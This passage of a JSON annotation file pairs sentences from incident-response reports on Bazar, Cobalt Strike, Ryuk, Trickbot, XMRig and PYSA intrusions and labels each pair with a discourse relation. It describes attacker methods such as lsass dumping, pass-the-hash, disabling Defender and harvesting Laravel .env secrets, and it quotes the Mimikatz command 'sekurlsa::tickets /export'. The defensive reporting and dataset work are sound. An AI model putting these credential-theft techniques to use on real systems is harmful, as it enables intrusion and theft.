        "S2": "\ud83d\udd11 w/ 'DTrump4ever' password \u2014 R3MRUM (@R3MRUM) March 26, 2021",
        "relation": "MISC"
    },
    {
        "S1": "We\u2019ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.",
        "S2": "With the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.",
        "relation": "MISC"
    },
    {
        "S1": "-smode switch configures OS to boot into safe mode w/ networking via:",
        "S2": "After rebooting out of Safe Mode, you are left with the following desktop:",
        "relation": "NEXT"
    },
    {
        "S1": "In this case we started with a DocuSign themed Excel maldoc.",
        "S2": "Thanks to @ffforward for the document as well as the sandbox run leading up to the xls file.",
        "relation": "MISC"
    },
    {
        "S1": "The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader.",
        "S2": "A DocuSign themed Excel xls was opened and macros were enabled.",
        "relation": "MISC"
    },
    {
        "S1": "The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader.",
        "S2": "We assess that the end goal of this intrusion was to execute domain wide ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader.",
        "S2": "About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.",
        "relation": "NEXT"
    },
    {
        "S1": "Once Bazar was established the malware quickly injected into the Werfault process to avoid detection.",
        "S2": "Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days.",
        "relation": "MISC"
    },
    {
        "S1": "Once Bazar was established the malware quickly injected into the Werfault process to avoid detection.",
        "S2": "About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.",
        "relation": "MISC"
    },
    {
        "S1": "As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest.",
        "S2": "We then executed the follow on malware manually.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller.",
        "S2": "Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller.",
        "S2": "Shortly after Cobalt Strike was executed, it dropped several Anchor executable files.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on the domain controller, the threat actors ran additional discovery but then went quiet.",
        "S2": "The threat actors were briefly active on day 3 to execute their Get-DataInfo script to collect additional information, which is usually followed closely by Ryuk ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days.",
        "S2": "About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.",
        "relation": "MISC"
    },
    {
        "S1": "However, on the fifth day the threat actors access was cut off before final objectives could be accomplished.",
        "S2": "The threat actors were seen using remote thread creation to inject into lsass to extract credentials.",
        "relation": "MISC"
    },
    {
        "S1": "We assess that the end goal of this intrusion was to execute domain wide ransomware.",
        "S2": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.",
        "relation": "MISC"
    },
    {
        "S1": "We assess that the end goal of this intrusion was to execute domain wide ransomware.",
        "S2": "We saw this across most machines in the domain.",
        "relation": "MISC"
    },
    {
        "S1": "A DocuSign themed Excel xls was opened and macros were enabled.",
        "S2": "DocuSign was again the social engineering format of choice.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The macro in this maldoc is using Excel 4 Macros.",
        "S2": "This script and files are available @ https://thedfirreport.com/services/",
        "relation": "ELABORATION"
    },
    {
        "S1": "We then executed the follow on malware manually.",
        "S2": "Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after Cobalt Strike was executed, it dropped several Anchor executable files.",
        "S2": "Anchor was also seen triggering process tampering.",
        "relation": "NEXT"
    },
    {
        "S1": "AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster.",
        "S2": "Cobalt Strike was seen locking access to SMB beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.",
        "S2": "Bazar initiated some discovery activity within 10 minutes of executing.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike was seen locking access to SMB beacons.",
        "S2": "Cobalt Strike initiated the following discovery commands:",
        "relation": "LIST"
    },
    {
        "S1": "The threat actors were seen using remote thread creation to inject into lsass to extract credentials.",
        "S2": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.",
        "relation": "MISC"
    },
    {
        "S1": "Bazar initiated some discovery activity within 10 minutes of executing.",
        "S2": "The exact files were mentioned in our Bazar, No Ryuk report.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike initiated the following discovery commands:",
        "S2": "Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike",
        "relation": "MISC"
    },
    {
        "S1": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.",
        "S2": "Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.",
        "S2": "We believe this intrusion would have ended with domain wide ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller.",
        "S2": "The exact files were mentioned in our Bazar, No Ryuk report.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time they dropped the files on a domain controller in C:\\info",
        "S2": "Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike",
        "relation": "MISC"
    },
    {
        "S1": "start.bat was executed with the following:",
        "S2": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "S2": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "S2": "Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike",
        "S2": "The threat actors also used SMB beacons executed by remote services as well.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.",
        "S2": "The deployment of the Get-DataInfo.ps1 script and overall TTP\u2019s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also used SMB beacons executed by remote services as well.",
        "S2": "The threat actors also used RDP to login to multiple machines within the domain.",
        "relation": "LIST"
    },
    {
        "S1": "We saw this across most machines in the domain.",
        "S2": "We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also used RDP to login to multiple machines within the domain.",
        "S2": "No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication.",
        "S2": "We assess that this exfiltration was performed over an encrypted C2 channel.",
        "relation": "MISC"
    },
    {
        "S1": "We assess that this exfiltration was performed over an encrypted C2 channel.",
        "S2": "We believe this intrusion would have ended with domain wide ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "We believe this intrusion would have ended with domain wide ransomware.",
        "S2": "Enjoy our report?",
        "relation": "MISC"
    },
    {
        "S1": "Enjoy our report?",
        "S2": "We also have pcaps, memory captures, scripts, executables, and Kape packages available here",
        "relation": "ELABORATION"
    },
    {
        "S1": "An attacker logged in through RDP a few days ago to run a \u201csmtp cracker\u201d that scans a list of IP addresses or URLs looking for misconfigured Laravel systems.",
        "S2": "What is Laravel?",
        "relation": "ELABORATION"
    },
    {
        "S1": "These attackers are looking for websites that have debug mode enabled, which allows the attacker to see their .env (config) file.",
        "S2": "The attacker installed and used Python 2.7 to execute the smtp cracker script.",
        "relation": "MISC"
    },
    {
        "S1": "The .env file includes AWS, O365, SendGrid, Twilio credentials and more.",
        "S2": "; it uses the above methods to crawl a list of IPs/URLs looking for specific strings in the response such as PayPal, AWS_KEY, SES_KEY, Twilio, sendgrid, office365, zoho, mailgun and others.",
        "relation": "MISC"
    },
    {
        "S1": "The .env file includes AWS, O365, SendGrid, Twilio credentials and more.",
        "S2": "In the response, you will see the debug option as well as all the information from the .env file, which includes the secrets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Laravel provides drivers for SMTP, Mailgun, Mandrill, Amazon SES, PHP\u2019s mail function, and sendmail, allowing you to quickly get started sending mail through a local or cloud based service of your choice.",
        "S2": "; it uses the above methods to crawl a list of IPs/URLs looking for specific strings in the response such as PayPal, AWS_KEY, SES_KEY, Twilio, sendgrid, office365, zoho, mailgun and others.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Laravel provides drivers for SMTP, Mailgun, Mandrill, Amazon SES, PHP\u2019s mail function, and sendmail, allowing you to quickly get started sending mail through a local or cloud based service of your choice.",
        "S2": "The debug option is turned off by default on Laravel systems, but it appears many users are enabling debug and not understanding the consequences.",
        "relation": "MISC"
    },
    {
        "S1": "The debug option is turned off by default on Laravel systems, but it appears many users are enabling debug and not understanding the consequences.",
        "S2": "In the response, you will see the debug option as well as all the information from the .env file, which includes the secrets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The output of the script is saved in a folder named Results.",
        "S2": "The attacker installed and used Python 2.7 to execute the smtp cracker script.",
        "relation": "MISC"
    },
    {
        "S1": "This lead to Bazar being dropped on the system, which created a run key for persistence.",
        "S2": "On the second day, we observed DNS requests to .bazar domain names (the hallmark of the Bazar malware family).",
        "relation": "MISC"
    },
    {
        "S1": "On the second day, we observed DNS requests to .bazar domain names (the hallmark of the Bazar malware family).",
        "S2": "On the third day, more communication was observed between the Bazar and Cobalt Strike infrastructure, but again, no downloads or follow-on activity was observed.",
        "relation": "NEXT"
    },
    {
        "S1": "On the second day, we observed DNS requests to .bazar domain names (the hallmark of the Bazar malware family).",
        "S2": "We first saw this script about a year ago when threat actors deployed Ryuk ransomware across a domain.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly thereafter, the threat actors began moving laterally using multiple techniques, such as:",
        "S2": "The threat actors then continued pivoting and collecting more information about the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "On that domain controller, they executed AdFind, and then dropped a custom PowerShell script named Get-DataInfo.ps1.",
        "S2": "After beginning lateral movement, the threat actors used the following Window\u2019s utilities for system profiling:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We first saw this script about a year ago when threat actors deployed Ryuk ransomware across a domain.",
        "S2": "However, in this case, about 15 minutes after running the script, the threat actor dropped their access and left the environment.",
        "relation": "MISC"
    },
    {
        "S1": "We first saw this script about a year ago when threat actors deployed Ryuk ransomware across a domain.",
        "S2": "We do not know what caused them to leave, but we have some ideas.",
        "relation": "MISC"
    },
    {
        "S1": "Other public data has also linked this TTP to Ryuk threat actors.",
        "S2": "We recently started offering intel feeds based on different command and control infrastructure such as Cobalt Strike, Qbot, Trickbot, PoshC2, PS Empire, etc. and this feed would have alerted on the Cobalt Strike C2 in this case.",
        "relation": "MISC"
    },
    {
        "S1": "However, in this case, about 15 minutes after running the script, the threat actor dropped their access and left the environment.",
        "S2": "Total time in the environment was around 4 days.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, in this case, about 15 minutes after running the script, the threat actor dropped their access and left the environment.",
        "S2": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1",
        "relation": "MISC"
    },
    {
        "S1": "Based on the TTP\u2019s of this intrusion, we assess, with medium to high confidence, that Ryuk would have been the likely ransomware deployed.",
        "S2": "We recently started offering intel feeds based on different command and control infrastructure such as Cobalt Strike, Qbot, Trickbot, PoshC2, PS Empire, etc. and this feed would have alerted on the Cobalt Strike C2 in this case.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the TTP\u2019s of this intrusion, we assess, with medium to high confidence, that Ryuk would have been the likely ransomware deployed.",
        "S2": "The use of the Cobalt Strike\u2019s piped privilege escalation (Get-System) was used several times during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Total time in the environment was around 4 days.",
        "S2": "Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.",
        "relation": "MISC"
    },
    {
        "S1": "We recently started offering intel feeds based on different command and control infrastructure such as Cobalt Strike, Qbot, Trickbot, PoshC2, PS Empire, etc. and this feed would have alerted on the Cobalt Strike C2 in this case.",
        "S2": "The use of the Cobalt Strike\u2019s piped privilege escalation (Get-System) was used several times during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "If you\u2019re interested in pricing or interested in a trial please use Contact Us to get in touch.",
        "S2": "We were not able to recover any proof other than parent/child processes.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.",
        "S2": "Additionally via the use of YARA inspection we found Cobalt Strike running or injected into processes across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.",
        "S2": "The embedded macro in the file was using an Excel 4.0 macro, which at time of execution had a detection rate of 1/63 in Virustotal.",
        "relation": "NEXT"
    },
    {
        "S1": "This file was found to be a BazarBackdoor sample.",
        "S2": "We also see the Cobalt Strike Beacon running in the dllhost.exe process, loading PowerShell to perform PowerSploit commands in the discovery section.",
        "relation": "MISC"
    },
    {
        "S1": "The use of the Cobalt Strike\u2019s piped privilege escalation (Get-System) was used several times during the intrusion.",
        "S2": "The threat actors deployed several types of lateral movements over the course of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "After loading the Cobalt Strike DLL, there was an almost instant injection by the process into the Werfault process.",
        "S2": "Additionally via the use of YARA inspection we found Cobalt Strike running or injected into processes across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "We also see the Cobalt Strike Beacon running in the dllhost.exe process, loading PowerShell to perform PowerSploit commands in the discovery section.",
        "S2": "On the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:",
        "relation": "MISC"
    },
    {
        "S1": "Lsass was dumped using Cobalt Strike on multiple occasions.",
        "S2": "SMB Beacon as its called in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "We were not able to recover any proof other than parent/child processes.",
        "S2": "On the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:",
        "relation": "MISC"
    },
    {
        "S1": "A day after initial access, Bazar initiated some discovery activity using Nltest:",
        "S2": "After running that, the threat actors used nltest again to confirm domain trusts:",
        "relation": "MISC"
    },
    {
        "S1": "On the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:",
        "S2": "Once the threat actors had access to a domain controller, they ran the following PowerShell discovery:",
        "relation": "NEXT"
    },
    {
        "S1": "On the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:",
        "S2": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actors had access to a domain controller, they ran the following PowerShell discovery:",
        "S2": "The local time was also queried on the domain controller:",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actors had access to a domain controller, they ran the following PowerShell discovery:",
        "S2": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1",
        "relation": "ELABORATION"
    },
    {
        "S1": "After running that, the threat actors used nltest again to confirm domain trusts:",
        "S2": "The threat actors deployed several types of lateral movements over the course of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The local time was also queried on the domain controller:",
        "S2": "Finally, the following collection of files were dropped on the domain controller:",
        "relation": "MISC"
    },
    {
        "S1": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1",
        "S2": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors deployed several types of lateral movements over the course of the intrusion.",
        "S2": "The threat actors also leveraged SMB to send Cobalt Strike Beacon executables to $ADMIN shares and again execute them on the remote systems via a service.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also leveraged SMB to send Cobalt Strike Beacon executables to $ADMIN shares and again execute them on the remote systems via a service.",
        "S2": "Pass the Hash was also used by the attackers while pivoting through the environment.",
        "relation": "LIST"
    },
    {
        "S1": "A threat actor recently brute forced a local administrator password using RDP and then dumped credentials using Mimikatz.",
        "S2": "The threat actor used Advanced IP Scanner to scan the environment before RDPing into multiple systems, including a Domain Controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A threat actor recently brute forced a local administrator password using RDP and then dumped credentials using Mimikatz.",
        "S2": "Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:",
        "relation": "NEXT"
    },
    {
        "S1": "They not only dumped LogonPasswords but they also exported all Kerberos tickets.",
        "S2": "After an hour of moving around the environment, they deployed XMRig on the initial compromised system before logging off.",
        "relation": "NEXT"
    },
    {
        "S1": "They not only dumped LogonPasswords but they also exported all Kerberos tickets.",
        "S2": "Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor used Advanced IP Scanner to scan the environment before RDPing into multiple systems, including a Domain Controller.",
        "S2": "Advanced IP Scanner was used to scan the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor used Advanced IP Scanner to scan the environment before RDPing into multiple systems, including a Domain Controller.",
        "S2": "The threat actor was active on the network for about 2 hours in total.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After an hour of moving around the environment, they deployed XMRig on the initial compromised system before logging off.",
        "S2": "During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.",
        "relation": "MISC"
    },
    {
        "S1": "After an hour of moving around the environment, they deployed XMRig on the initial compromised system before logging off.",
        "S2": "Advanced IP Scanner was used to scan the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor logged in using RDP from an IP (92.118.13[.]103) that hadn\u2019t attempted any previous logins.",
        "S2": "The threat actor used a workstation named winstation.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor used a workstation named winstation.",
        "S2": "The threat actor copied svshost.exe to C:",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.",
        "S2": "We tend to block mining endpoints, which may have lessened the impact of this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.",
        "S2": "Before the threat actor disconnected, they changed the user password.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor copied svshost.exe to C:",
        "S2": "Before the threat actor disconnected, they changed the user password.",
        "relation": "MISC"
    },
    {
        "S1": "The PE file that installs XMRig (svshost.exe) also has a script (HideAll.bat) imbedded in it, which is called at runtime.",
        "S2": "This script is copied to C:\\Windows\\PolicyDefitions\\ and run, which causes the files specified to be hidden.",
        "relation": "NEXT"
    },
    {
        "S1": "Before the threat actor disconnected, they changed the user password.",
        "S2": "The threat actors used a vbs script named launch to execute mimikatz.",
        "relation": "MISC"
    },
    {
        "S1": "Before the threat actor disconnected, they changed the user password.",
        "S2": "The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.",
        "relation": "MISC"
    },
    {
        "S1": "Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:",
        "S2": "The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors used a vbs script named launch to execute mimikatz.",
        "S2": "The threat actors have been using the associated Monero wallet for 738+ days and have netted around $5,159.",
        "relation": "NEXT"
    },
    {
        "S1": "The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.",
        "S2": "XMRig was running on the system, using some CPU but not enough to cause any issues.",
        "relation": "NEXT"
    },
    {
        "S1": "The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.",
        "S2": "The threat actors have been using the associated Monero wallet for 738+ days and have netted around $5,159.",
        "relation": "NEXT"
    },
    {
        "S1": "XMRig was running on the system, using some CPU but not enough to cause any issues.",
        "S2": "XMRig made connection attempts to 104.140.201[.]42 & 104.142.244[.]186.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We tend to block mining endpoints, which may have lessened the impact of this intrusion.",
        "S2": "Or was this a recon mission?",
        "relation": "MISC"
    },
    {
        "S1": "We tend to block mining endpoints, which may have lessened the impact of this intrusion.",
        "S2": "We also have pcaps, files, and Kape packages available here.",
        "relation": "MISC"
    },
    {
        "S1": "The Trickbot threat actors used Cobalt Strike to pivot through-out the domain, dumping lsass and ntds.dit as they went.",
        "S2": "The original delivery mechanism was not found, but likely to have been a malicious email based on previous known Trickbot campaigns.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Trickbot threat actors used Cobalt Strike to pivot through-out the domain, dumping lsass and ntds.dit as they went.",
        "S2": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "They used tools such as AdFind, Nltest, Net, Bloodhound, and PowerView to peruse the domain, looking for high privileged credentials to accomplish their mission.",
        "S2": "The following Nltest commands were executed several times by the threat actors over the course of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After acquiring the necessary credentials, the threat actors used a technique called Overpass-the-hash to move to a backup server, before being kicked off the network.",
        "S2": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "We believe if this attack had been allowed to continue, it would have ended in domain wide ransomware, specifically Ryuk.",
        "S2": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot was manually executed on a single endpoint.",
        "S2": "After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).",
        "relation": "NEXT"
    },
    {
        "S1": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "S2": "The threat actors employed a couple different credential access techniques.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "S2": "Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
        "S2": "The following Nltest commands were executed several times by the threat actors over the course of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Subsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.",
        "S2": "This command, which is included in DPAT, dumps NTDS.dit to disk and has been used by Trickbot actors in the past.",
        "relation": "MISC"
    },
    {
        "S1": "Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.",
        "S2": "After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors employed a couple different credential access techniques.",
        "S2": "After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:",
        "relation": "MISC"
    },
    {
        "S1": "After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:",
        "S2": "While on systems, we also saw them use the following commands.",
        "relation": "MISC"
    },
    {
        "S1": "After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:",
        "S2": "The threat actors ran the AdFind utility for domain discovery.",
        "relation": "MISC"
    },
    {
        "S1": "While on systems, we also saw them use the following commands.",
        "S2": "We also have pcaps, files, and Kape packages available here.",
        "relation": "MISC"
    },
    {
        "S1": "The following Nltest commands were executed several times by the threat actors over the course of the intrusion.",
        "S2": "The threat actors utilized several lateral movement techniques.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike C2 #1:",
        "S2": "Cobalt Strike C2 #2:",
        "relation": "LIST"
    },
    {
        "S1": "In this intrusion the entry was a Windows host with RDP exposed to the internet.",
        "S2": "The login was from a Tor exit node and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of 3 different Tor exits being used to maintain RDP access to the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion the entry was a Windows host with RDP exposed to the internet.",
        "S2": "The threat actors leveraged many built-in Windows tools for discovery including the following:",
        "relation": "NEXT"
    },
    {
        "S1": "In this intrusion the entry was a Windows host with RDP exposed to the internet.",
        "S2": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
        "relation": "MISC"
    },
    {
        "S1": "The login was from a Tor exit node and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of 3 different Tor exits being used to maintain RDP access to the environment.",
        "S2": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.",
        "relation": "MISC"
    },
    {
        "S1": "The login was from a Tor exit node and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of 3 different Tor exits being used to maintain RDP access to the environment.",
        "S2": "During the intrusion we saw the PYSA threat actors attempt to access credentials via the following techniques::",
        "relation": "MISC"
    },
    {
        "S1": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.",
        "S2": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
        "relation": "MISC"
    },
    {
        "S1": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.",
        "S2": "After the encryption was done we were able to confirm exfiltration occurring by receiving a callback from a canary document.",
        "relation": "MISC"
    },
    {
        "S1": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.",
        "S2": "During the intrusion we saw the PYSA threat actors attempt to access credentials via the following techniques::",
        "relation": "MISC"
    },
    {
        "S1": "Each time they pivoted, they would check quser, and then dump lsass using Task Manager.",
        "S2": "- Dump lsass with Taskmanager",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the intrusion we saw the PYSA threat actors attempt to access credentials via the following techniques::",
        "S2": "The threat actor disabled security tools throughout the intrusion by using Local Security Policy Editor and MpPreference to disable Defender.",
        "relation": "MISC"
    },
    {
        "S1": "- Dump lsass with Taskmanager",
        "S2": "We also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor disabled security tools throughout the intrusion by using Local Security Policy Editor and MpPreference to disable Defender.",
        "S2": "The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor disabled security tools throughout the intrusion by using Local Security Policy Editor and MpPreference to disable Defender.",
        "S2": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
        "relation": "MISC"
    },
    {
        "S1": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
        "S2": "After around 7 hours post initial access, the threat actors began their final actions by RDPing into systems, dropping a PowerShell script and the ransomware executable.",
        "relation": "NEXT"
    },
    {
        "S1": "Koadic was only utilized on a few key servers and one of those servers included a persistence mechanism using the default Koadic HTA scheduled task module.",
        "S2": "Later during the intrusion, the threat actors employed another OST named Koadic.",
        "relation": "MISC"
    },
    {
        "S1": "After around 7 hours post initial access, the threat actors began their final actions by RDPing into systems, dropping a PowerShell script and the ransomware executable.",
        "S2": "The threat actors asked for 5 BTC or around $88,000 USD which tells us these attackers most likely base their ransom demand on the information exfiltrated.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors asked for 5 BTC or around $88,000 USD which tells us these attackers most likely base their ransom demand on the information exfiltrated.",
        "S2": "The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors asked for 5 BTC or around $88,000 USD which tells us these attackers most likely base their ransom demand on the information exfiltrated.",
        "S2": "We also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion.",
        "S2": "Later during the intrusion, the threat actors employed another OST named Koadic.",
        "relation": "NEXT"
    },
    {
        "S1": "Later during the intrusion, the threat actors employed another OST named Koadic.",
        "S2": "The threat actors displayed multiple techniques for gathering credentials during this intrusion.",
        "relation": "MISC"
    },
    {
